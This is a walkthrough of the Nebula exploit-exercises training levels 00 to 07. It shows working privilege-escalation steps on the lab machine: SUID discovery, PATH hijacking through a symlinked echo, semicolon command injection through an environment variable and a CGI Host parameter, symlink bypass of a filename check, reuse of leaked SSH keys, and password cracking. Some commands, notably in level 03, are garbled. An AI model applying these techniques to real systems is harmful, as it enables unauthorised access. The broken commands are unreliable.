EXPLOIT EXERCISES - NEBULA


Level 00 - You are required to find a Set User ID program that will run as "flag00"
There are a few variations of using the find command which id needed to complete the challenge such as

find / -perm /u=s -user flag00 2>/dev/null 
or
find / -user flag00 -type f -executable 2>/dev/null/bin/.../flag00

After each run

/bin/.../flag00

followed by

getflag 

which will complete the level



Level 01 - This involves a C program which is vulnerable, the vulnerability allows for arbitrary programs
to execute. The program itself calls 'echo' and then the text 'and now what?' is sent to the screen. The 
vulnerability lies in the fact that the echo is called using the environment settings like this -

system("/usr/bin/env echo and now what?");

************************************************************************************************************
Important - The /usr/bin/env is often used by scripts that need full paths eg 
#!/usr/bin/env python is used by python scripts to get a full path to the python interpreter.
Also remember that in bash a trailing colon can be considered as a potential security hole as it causes bash to
look for an executable in the current directory.
************************************************************************************************************

This means that the path needs to be modified in order to be exploited. Again there are a few ways of 
doing this but the easiest is to create a symbolic link as symbolic links can be used for bypassing name and 
location checks

level01@nebula:~$ ln -s /bin/getflag echo

level01@nebula:~$ export PATH=.:$PATH

Then run

level01@nebula:~$ /home/flag01/flag01 

and you should see the success message



Level 02 - This level presents another challenge similar to the previous one, this time the 'USER' is being called
directly. Again manipulation of the environmental variables is needed. The solution is fairly straightforward

$ export USER=";getflag;"
./flag02

this reassigns environment variables and then runs the file

*******************************************************************************************************************
Important - In this exercise the 'USER' is copied to a buffer without checking, needless to say that passing stuff
without checking at anytime is not a good idea.
*******************************************************************************************************************



Level 03 - In this level there is a crontab that runs every 5 minutes, and executes anything found in the local 
writable.d folder, then removes it.  When you check the flag03 directory the are 2 items the writable. directory
and a writable.sh script. There are a few widely different ways that this can be completed some more complex than 
others, firstly the directory is world read/write, which will allow us to add our own script which should give the 
success message as the script should run automatically without us needing to do anything, the exploit will be just 
to run the /bin/getflag program when executed. The solution is this -

echo "/bin/getflag >> /tmp/nebscript03" > scriptflag03
cat scriptflag03/bin/getflag >> /tmp/nebflag03
cat /tmp/nebflag03
In the above you have redirected the getflag into a temp file and on into a script, you then cat the script and
send to temp file, when you cat the temp file it causes it to run and you will have captured the flag.




Level 04 - In this challenge there is the need to find a vulnerability in the provided C++ program. There are a 
couple of verifications that are carried out by the file. This is the code itself 

#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
 char buf[1024];
 int fd, rc;

 if(argc == 1) {
  printf("%s [file to read]\n", argv[0]);
  exit(EXIT_FAILURE);
 }

 if(strstr(argv[1], "token") != NULL) {
  printf("You may not access '%s'\n", argv[1]);
  exit(EXIT_FAILURE);
 }

 fd = open(argv[1], O_RDONLY);
 if(fd == -1) {
  err(EXIT_FAILURE, "Unable to open %s", argv[1]);
 }

 rc = read(fd, buf, sizeof(buf));

 if(rc == -1) {
  err(EXIT_FAILURE, "Unable to read fd %d", fd);
 }

 write(1, buf, rc);
}

The first check is to ensure that you have have passed an argument in and the second check then is to see if the
word 'token' is used, if it is then the programs exits. Unfortunately the file needed to be examined is called token
so we have to find a way around this. There is only one clean way of doing this and that is to use symbolic links
to the file and open the link which should bypass the check. Using this to create a symlink

ln -s /home/flag04/token /tmp/filename (any filename will do)

and then running the getflag by running this command

./flag04 /tmp/filename (the filename you have used to create the link)

will finish the challenge.




Level 05 - 
The challenge this time is to check the flag05 home directory and look for weak permissions. The best way is to 
get started and then explain step by step
ls -ls - This reveals a directory called backup that is world readable.
cd .backup
ls -la .backup/ - This reveals a file called backup-19072011.tgz which is a gzipped tar archive
Copy the file to the level 5 home directory
Untar the file using - tar xzvf filename
The unzipped file contains ssh keys so using ssh flag05@localhost to ssh into level 5 works as there are no passes
only the keys.
Run the getflag.




Level 06 -
In this challenge you are told that the flag06 account credentials came from a legacy unix system. This means that
in all likelihood that the passwords will be stored in etc/passwd rather than the more modern and safer etc/shadow.
The solution in this case is fairly easy, load the file into a program like John The Ripper which will crack the
password. 


Level 07 - 
In the seventh challenge there is a perl script that pinged hosts to see if they are available from the web server.
The source code itself is below

#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));

The script itself takes Host as a parameter and running ping(param("Host")); just gives you a list of available
options for ping. This is also where the issues begin as there is no sanitation performed on input which leaves it
wide open to trouble. The other file in the directory is a thttpd.conf file which when it has cat run on it shows 
that the webserver runns on port 7007. This means that the solution is to connect to port 7007 on the web server
and using the Host parameter which is not sanitised should be enough to get through the challenge. There is also
a need to resolve the necessary url characters, there is a good tutorial here 

http://www.tutorialspoint.com/html/html_url_encoding.htm

also there is another linux utility called wget which is great to have and will be used here, this is a tutorial

http://www.thegeekstuff.com/2009/09/the-ultimate-wget-download-guide-with-15-awesome-examples/

With all of this in mind the solution should look like this

wget http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag or 
wget -O- http://localhost:7007/index.cgi?Host=%3b%20getflag

